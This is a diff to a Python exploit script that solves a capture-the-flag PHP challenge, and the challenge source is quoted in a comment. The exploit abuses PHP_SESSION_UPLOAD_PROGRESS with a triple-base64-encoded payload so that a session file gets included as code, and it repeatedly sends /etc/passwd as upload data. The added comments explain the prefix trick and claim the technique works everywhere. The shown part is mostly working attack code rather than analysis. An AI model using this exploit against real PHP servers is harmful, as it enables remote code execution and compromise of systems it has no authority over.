@@ -1,4 +1,10 @@
-#Credits : @orange
+#Credits : @orange_8361
+#Solution of:
+# <?php
+#   ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);
+#Comments added by: SpyD3r(@TarunkantG)
+#This technique will be vaild everywhere
+
 import sys
 import string
 import requests
@@ -31,12 +37,13 @@ while 1:
     xxx = b64encode(b64encode(b64encode(payload + junk)))
     if '=' not in x and '=' not in xx and '=' not in xxx:
         payload=xxx
-	print payload
+        print payload
         break
 
 def runner1(i):
     data = {
         'PHP_SESSION_UPLOAD_PROGRESS':  'ZZ' + payload
+        #We need to append with 'ZZ' becasue when it writes to the session file it have prefix: upload_progress_ before our payload, so if we append 'ZZ' in the prefix of our payload then, in the session it would be like: upload_progress_ZZ<payload>. And if you seen we are doing 3 times decoding with PHP filter because after decoding 3 times this (upload_progress_ZZ) becomes empty string. So now the file will start from your payload.
     }
     while 1:
         fp = open('/etc/passwd', 'rb')
